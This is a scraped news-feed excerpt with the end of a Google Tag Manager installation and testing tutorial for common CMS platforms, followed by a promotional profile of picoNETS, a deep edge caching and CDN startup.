src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCI+PGc+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIyNCIgd2lkdGg9IjI0Ii8+PC9nPjxnPjxnPjxnPjxwYXRoIGQ9Ik05LDIxYzAsMC41NSwwLjQ1LDEsMSwxaDRjMC41NSwwLDEtMC40NSwxLTF2LTFIOVYyMXogTTEyLDJDOC4xNCwyLDUsNS4xNCw1LDljMCwyLjM4LDEuMTksNC40NywzLDUuNzRWMTcgYzAsMC41NSwwLjQ1LDEsMSwxaDZjMC41NSwwLDEtMC40NSwxLTF2LTIuMjZjMS44MS0xLjI3LDMtMy4zNiwzLTUuNzRDMTksNS4xNCwxNS44NiwyLDEyLDJ6IE0xNCwxMy43VjE2aC00di0yLjMgQzguNDgsMTIuNjMsNywxMS41Myw3LDljMC0yLjc2LDIuMjQtNSw1LTVzNSwyLjI0LDUsNUMxNywxMS40OSwxNS40OSwxMi42NSwxNCwxMy43eiIvPjwvZz48L2c+PC9nPjwvc3ZnPg==" alt="tip" height="42px"><p><b>If your CMS also offers you a plugin to install other tags</b></p><div><p>Don't use yet another plugin to install Google Analytics, Facebook or Google Ads.</p><p>Instead, <b>use GTM to install those tags</b>.</p><br><ol><li>It will result in a faster page load speed</li><li>It gives you more options to configure the tag</li></ol></div><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>The GTM user interface also receives updates with new features regularly, so you are almost always better off implementing other marketing tags directly with it than with another integration.</p><p>Plus, the gains in load time are good for your bounce rate and help SEO.</p><h3 id="use-a-plugin-to-implement-gtm"><a href="#use-a-plugin-to-implement-gtm" aria-label="Use a plugin to implement GTM" title="Right click to copy link to paragraph"></a>Use a plugin to implement GTM</h3><p>Below a list of the most common content management systems and their plugins to install Google Tag Manager.</p><h4 id="wordpress"><a href="#wordpress" aria-label="WordPress" title="Right click to copy link to paragraph"></a>WordPress</h4><p>There are two WordPress plugins to implement GTM that I would use. <b>First</b>, there is the classic option called <a rel="noopener" target="_blank" href="https://wordpress.org/plugins/duracelltomi-google-tag-manager/">Google Tag Manager for WordPress</a>.<br>The <b>second</b> option is <a rel="noopener" target="_blank" href="https://wordpress.org/plugins/google-site-kit/">Site Kit by Google</a>. It primarily allows you to add a dashboard to your Worpress backend showing information from your Google Analytics account and Google Search Console data - which is pretty sweet. And it also allows you to install GTM.</p><h4 id="shopify"><a href="#shopify" aria-label="Shopify" title="Right click to copy link to paragraph"></a>Shopify</h4><p>For Shopify, there is a <b>free</b> plugin for GTM installation creatively called <em><a rel="noopener" target="_blank" href="https://apps.shopify.com/trafficguard?surface_detail=google+tag+manager&amp;surface_inter_position=1&amp;surface_intra_position=6&amp;surface_type=search">Google Tag Manager Installer</a></em>.</p><h4 id="squarespace"><a href="#squarespace" aria-label="Squarespace" title="Right click to copy link to paragraph"></a>Squarespace</h4><p>For Squarespace, there is no GTM extension or plugin. But you can add the GTM tag manually, by visiting <b>sidebar</b> &gt; <b>settings</b> &gt; <b>advanced</b> &gt; <b>code injection</b>.</p><figure><div></div><figcaption>In Squarespace you can implement GTM under Settings &gt; Advanced &gt; Code Injection</figcaption></figure><p>Next, you paste the GTM tag into the form fields like this:</p><figure><div></div><figcaption>Put the first part of the GTM code in the header field. The Second part goes into the footer field.</figcaption></figure><h4 id="wix"><a href="#wix" aria-label="Wix" title="Right click to copy link to paragraph"></a>Wix</h4><p>Visit the main menu for your Wix website on the left sidebar. From there visit <b>Marketing &amp; SEO</b> and then click on <b>Marketing Integrations</b> further down in the sidebar.<br>Then you will find multiple Wix integrations for Google Analytics, the Facebook pixel and also one Wix extension to implement Google Tag Manager.</p><figure><div></div><figcaption>In Wix use the marketing integration for Google Tag Manager.</figcaption></figure><p>Click on connect and get Google Tag Manager installed.</p><h2 id="how-to-check-if-gtm-is-working"><a href="#how-to-check-if-gtm-is-working" aria-label="How to check if GTM is working?" title="Right click to copy link to paragraph"></a>How to check if GTM is working?</h2><a href="https://twitter.com/intent/tweet?text=When%20you%20first%20log%20in%20to%20GTM...Go%20to%20the%20submit%20button%20and%20publish%20an%20empty%20container.%20Otherwise,%20once%20you%20test%20if%20GTM%20works,%20the%20script%20will%20return%20a%20400%20response%20error%20and%20you%20will%20spend%20hours%20debugging%20why.%20%F0%9F%98%AD%20-%20via%20undefined" target="_blank"><section type="info"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCI+PGc+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIyNCIgd2lkdGg9IjI0Ii8+PC9nPjxnPjxnPjxnPjxwYXRoIGQ9Ik05LDIxYzAsMC41NSwwLjQ1LDEsMSwxaDRjMC41NSwwLDEtMC40NSwxLTF2LTFIOVYyMXogTTEyLDJDOC4xNCwyLDUsNS4xNCw1LDljMCwyLjM4LDEuMTksNC40NywzLDUuNzRWMTcgYzAsMC41NSwwLjQ1LDEsMSwxaDZjMC41NSwwLDEtMC40NSwxLTF2LTIuMjZjMS44MS0xLjI3LDMtMy4zNiwzLTUuNzRDMTksNS4xNCwxNS44NiwyLDEyLDJ6IE0xNCwxMy43VjE2aC00di0yLjMgQzguNDgsMTIuNjMsNywxMS41Myw3LDljMC0yLjc2LDIuMjQtNSw1LTVzNSwyLjI0LDUsNUMxNywxMS40OSwxNS40OSwxMi42NSwxNCwxMy43eiIvPjwvZz48L2c+PC9nPjwvc3ZnPg==" alt="tip" height="42px"><p><b>When you first log in to GTM</b></p><div><p>Go to the submit button and publish an <b>empty container</b>.</p><div><p>Otherwise, once you test if GTM works, the script will return a <b>400 response error</b> and you will spend hours debugging why. üò≠ </p><p>It's a classic üòâ</p></div></div><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>After you implemented the GTM script and <b>published a container</b> version (important), you can test if Google Tag Manager is working by doing any of these checks:</p><ol><li><h3 id="preview-and-debug-mode"><a href="#preview-and-debug-mode" aria-label="Preview and debug mode" title="Right click to copy link to paragraph"></a>Preview and debug mode</h3>Log into your GTM account and click on <b>preview</b>. Then, open a new tab in the browser and visit your website. The GTM debugger window should pop open on the bottom of the window if GTM works correctly.<br><figure><div></div><figcaption>Activate the GTM debugger mode to check if GTM is working correctly.</figcaption></figure></li><li><h3 id="chrome-developer-tools"><a href="#chrome-developer-tools" aria-label="Chrome Developer Tools" title="Right click to copy link to paragraph"></a>Chrome Developer Tools</h3><b>Open Chrome Developer Tools</b> with a right-click on any page of your site and select <em>inspect</em> (Alternatively F12 on Windows and Shift+CTRL+J on Mac).<br>Then you go to the <b>network</b> tab and <b>simultaneously reload the web page</b> (F5 on Windows and CMD+Shift+R on Mac). The network tab will fill with all network requests necessary to load the page.<br>In the filter field in the top-left, type <em>gtm.js</em> to find the request for your JavaScript code and verify it has a <b>status code of 200</b>.<p>Let me show you:</p><video loading="lazy" title="Check if Google Tag Manager is working" loop="" controls=""><source src="https://bluerivermountains.com/video/check-if-gtm-is-working.mp4" type="video/mp4"></video><br><b>If you don‚Äôt have a 200 status code, maybe you forgot to submit and publish a container first in GTM?</b></li><li><h3 id="google-tag-assistant"><a href="#google-tag-assistant" aria-label="Google Tag Assistant" title="Right click to copy link to paragraph"></a>Google Tag Assistant</h3>Install the <a rel="noopener" target="_blank" href="https://chrome.google.com/webstore/detail/tag-assistant-by-google/kejbdjndbnbjgmefkgdddjlbokphdefk">Google Tag Assistant</a> Chrome extension and start it on your site. It should call out a GTM container ID.<br><div width="452px"><figure><div></div><figcaption>You can also use the Chrome Extension Google Tag Assistant to ensure Google Tag Manager is working correctly.</figcaption></figure></div></li></ol><h2 id="how-to-set-up-google-tag-manager"><a href="#how-to-set-up-google-tag-manager" aria-label="How to set up Google Tag Manager?" title="Right click to copy link to paragraph"></a>How to set up Google Tag Manager?</h2><p>When setting up Google Tag Manager you can make many advanced configurations. So <b><em>how</em></b> you set up GTM, depends on what other tools you plan to use in your <a href="https://bluerivermountains.com/en/tag-management">tag management system</a>.</p><p>That's why I brought together all relevant tutorials that cover whatever you could possibly want to set up in your GTM account - with examples. Simply follow this Google Tag&nbsp;Manager guide and thereby create a solid tag management foundation for your site.</p><p>Only the tutorial on implementing a data layer requires coding skills or potentially web developers.</p><p><b>Note</b>: In this Google Tag Manager tutorial, we will use GTM by <b>manually</b> setting up new tags and triggers for each event. The approach is not super scalable, but it is fast enough and easy, while meeting most tracking ambitions and still being applicable to other advanced setups.</p><p>Larger websites and e-commerce stores require a <b>scalable tag management solution</b>. Therefore a <a href="https://bluerivermountains.com/en/datalayer">data layer</a> is implemented as the central piece to track events. With such a setup, you can use event handlers instead of setting up tags, triggers and variables for each event.</p><ol><li><h3 id="set-up-google-analytics-tracking"><a href="#set-up-google-analytics-tracking" aria-label="Set up Google Analytics tracking" title="Right click to copy link to paragraph"></a>Set up Google Analytics tracking</h3><p>This is the first step for everybody. Learn in this guide how to implement solid Google Analytics tracking, with Goals, Funnels, and your own visits excluded from the traffic. Plus more best practices.</p><a href="https://bluerivermountains.com/en/google-analytics-setup"></a></li><li><h3 id="set-up-event-tracking"><a href="#set-up-event-tracking" aria-label="Set up event tracking" title="Right click to copy link to paragraph"></a>Set up event tracking</h3><p>Once the fundamental tracking implementation is running as it should, you will also want to learn tracking user engagement. How often, for example, does a visitor send form submissions and click on a submit button or another HTML element? My <a href="https://bluerivermountains.com/en/event-tracking">event tracking</a> guide explains exactly that for a <b>button click</b> and you can use the same method for any other click tracking.</p><a href="https://bluerivermountains.com/en/event-tracking"></a></li><li><p>The most common use-case for GTM <em>after</em> installing GA is adding remarketing tags to a website. After all, they make the majority of 3rd-party marketing tags and tracking codes that ‚Ä¶</p></li></ol></div></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bluerivermountains.com/en/google-tag-manager-setup">https://bluerivermountains.com/en/google-tag-manager-setup</a></em></p>]]>
            </description>
            <link>https://bluerivermountains.com/en/google-tag-manager-setup</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941974</guid>
            <pubDate>Fri, 30 Oct 2020 13:29:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Edge Caching and Computing by PicoNETS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941965">thread link</a>) | @ponderingfish
<br/>
October 30, 2020 | https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/ | <a href="https://web.archive.org/web/*/https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/piconets-deep-edge-caching-featured-images.png?resize=678%2C381&amp;ssl=1" alt="piconets-deep-edge-caching-featured-images" title="piconets-deep-edge-caching-featured-images" data-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/piconets-deep-edge-caching-featured-images.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p>In this edition of the <a href="https://ottverse.com/category/industry-spotlight/">Industry Spotlight</a> series, we take a look at <a href="https://www.piconets.com/" target="_blank" rel="noopener">picoNETS</a>; a startup focused on building Deep Edge Content Delivery Networks or Deep Edge Caching for Telcos and Content Providers.</p>



<p>Let‚Äôs take a look at their product, journey, USP, and what sets them apart from the rest, shall we?</p>




<h2><span id="Who_is_picoNETS"></span>Who is picoNETS?<span></span></h2>



<p>picoNETS is a&nbsp;<strong>Deep Edge Content Delivery Network</strong>&nbsp;provider started in 2016, and they primarily work with telecom and content providers. Some of their USPs and accomplishments are ‚Äì</p>



<ul><li>They are a Deep Edge CDN for media delivery and also provide edge computing resources.</li><li>picoNETS is a partner of the&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://ruralcloud.com/">Rural Cloud Initiative</a>&nbsp;in the US and is engaged with top OTT platforms in India</li><li>They are live in 5G Labs for a US Telco and have gained traction with Carriers, Telcos, and ISPs in the US, UK, India, Singapore, South Korea, Vietnam, Indonesia, Bangladesh, and Fiji.</li></ul>



<h2><span id="How_does_picoNETS%E2%80%99_Edge_Caching_Work"></span>How does picoNETS‚Äô Edge Caching Work?<span></span></h2>



<p>Before we dive into the ‚Äúhow,‚Äù let‚Äôs understand why there is a need for a&nbsp;<strong>deep edge CDN</strong>&nbsp;like the one offered by picoNETS.</p>



<p>Let‚Äôs take the example of rural America. </p>



<p>A recent article from&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.theverge.com/21504476/online-school-covid-pandemic-rural-low-income-internet-broadband">The Verge</a>&nbsp;highlighted the struggle faced by rural Americans in their pursuit of high speed Internet and how this problem was exacerbated in the face of the COVID-19 pandemic. A&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.reddit.com/r/technology/comments/j6wor7/americas_internet_wasnt_prepared_for_online/">raging debate on the same article in Reddit</a>&nbsp;underscored the struggle of everyday, rural America.</p>



<p>In addition to a lack of high-speed internet, if a CDN provider does not have a point of presence (PoP) near your city/town/village, then you are going to face problems with streaming video. </p>



<p>Video streaming problems manifest in different ways ‚Äì a long delay in showing the first picture (startup delay or latency), buffering issues during playback, or while seeking back or forth in the video, and in the worst case, complete stalls or fatal errors. Apart from these problems, a low-bandwidth connection is quite likely to result in a low resolution (or bitrate) video being delivered to your device.</p>



<p>All of these problems amount to an abysmal viewing experience, right?</p>



<p>So what‚Äôs the solution to these problems?</p>



<p>Well, one could argue that it‚Äôs up to the CDN provider to establish more POPs (geographically distributed) and improve their coverage. While this is a reasonable argument, it can be challenging in terms of infrastructural costs and the RoI for the CDN provider.</p>



<p>However, if you continue this train of thought, you end up with a business model that establishes POPs at a much more granular level.</p>



<p>What do I mean by this?</p>



<p>Well, instead of establishing a POP in every town or city, why not go deeper and install a POP at every airport, shopping mall, school, university, or post office?</p>



<p>Is it possible? Well, it sure is and <strong>this is the USP of picoNETS.</strong></p>



<p>picoNETS go ‚Äúdeep‚Äù and establish ‚Äúdeep edge caches‚Äù right next to your underserved target audience to ensure that they get a fantastic QoE.</p>



<p>A prototypical customer of picoNETS could be a university that uses the deep edge cache to provide buffer-free, high quality, online classes for their students (live or on-demand).</p>



<p>Here is an illustration of the concept we just discussed. </p>



<figure><img data-attachment-id="1128" data-permalink="https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/piconets/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=960%2C540&amp;ssl=1" data-orig-size="960,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="picoNETS" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=960%2C540&amp;ssl=1" loading="lazy" width="960" height="540" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" alt="picoNETS edge caching" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?w=960&amp;ssl=1 960w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=678%2C381&amp;ssl=1 678w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2><span id="The_benefit_of_using_picoNETS"></span>The benefit of using picoNETS<span></span></h2>



<p>Now that we‚Äôve established that picoNETS brings caching closer to your customer (the ‚Äúwhy‚Äù and the ‚Äúhow‚Äù), the benefits are evident and critical to a good user experience. </p>



<p>With picoNETS, you get,</p>



<ul><li><strong>low latency media delivery</strong>&nbsp;‚Äì this is important in reducing stalls, and time-to-first-byte, startup-delay</li><li><strong>reduced buffering</strong>&nbsp;during playback and during seeks.</li><li>the ability to <strong>scale and deliver media</strong> when content goes viral especially, in a geo-localized manner. </li></ul>



<p>Another cool use-case for picoNETS is in the online multiplayer gaming industry. </p>



<p>It is important for gaming engines to synchronize each player‚Äôs location with the rest of the players, or else the game-play is spoiled, and there could be unfair advantages to certain players over others.</p>



<p>picoNETS tries to solve such problems by&nbsp;<strong>providing edge-computing</strong>&nbsp;in addition to their edge caching capabilities. By moving the decision and synchronization engines closer to the players (edge, i.e.), game-play is improved, and the latency incurred in player-synchronization is reduced.</p>



<p>All this sounds nice, right? But, my mind went straight to a commercial deployment scenario and I wasn‚Äôt sure how picoNETS would work alongside a traditional CDN. Do you need to use both or either one?</p>



<p>Well, let‚Äôs find out. </p>



<h2><span id="How_Do_You_Choose_Between_a_CDN_and_picoNETS_Deep_Edge_Cache"></span>How Do You Choose Between a CDN and picoNETS Deep Edge Cache?<span></span></h2>



<p>While speaking to&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.linkedin.com/in/ashishrbedekar">Ashish Bedekar</a>, picoNETS‚Äô COO, I asked him what a typical deployment looks like and how does it impact their customers‚Äô operations?</p>



<p>He mentioned that the deployment is quite straightforward (similar to other CDN deployments). And, the decision to switch between a customers‚Äô incumbent, traditional CDN and picoNETS happens at the CMS level.</p>



<p>At the CMS, a decision is taken to playback a stream using the CDN or with the picoNETS Deep Edge Cache. The decision is based on the ASN value, and Ashish told me that the rules could be more fine-grained as needed.</p>



<p>For example, their multi-CDN router allows you to add rules to direct premium subscribers‚Äô traffic vs. others. Also, they have fail-over policies to ensure that the end-user is never left hanging!</p>



<p>This multi-CDN approach is smart and allows you to fine-tune your deployment to take advantage of each service (CDN &amp; picoNETS) in its ‚Äúarea of strength‚Äù.</p>



<p>Here‚Äôs an example of their architecture that demonstrates this. </p>



<figure><img data-attachment-id="1090" data-permalink="https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/image-2/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=1202%2C706&amp;ssl=1" data-orig-size="1202,706" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=1024%2C601&amp;ssl=1" loading="lazy" width="1024" height="601" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" alt="picoNETS edge cache" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=300%2C176&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=768%2C451&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1200%2C705&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?w=1202&amp;ssl=1 1202w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Again, it‚Äôs best to get in touch with picoNETS to discuss specifics.</p>



<h2><span id="Get_in_touch_with_picoNETS"></span>Get in touch with picoNETS<span></span></h2>



<p>To learn more about their technology and to talk to the picoNETS team for further information, you can either <a href="https://www.piconets.com/" target="_blank" rel="noopener">visit their website</a> or <a href="mailto:ashish.bedekar@piconets.com">email Ashish Bedekar</a>.</p>



<h2><span id="Conclusion"></span>Conclusion<span></span></h2>



<p>It is critical to get your content delivery strategy on point when it comes to OTT and I think there is a lot of scope for improving the current techniques used in CDNs, Edge Caching, P2P, etc. with the ultimate goal of providing a sublime viewing experience for the end-users.</p>



<p>I think the work that picoNETS is doing is great, serves a very underserved segment of our population, and helps them enjoy the same benefits as those in urban areas!</p>



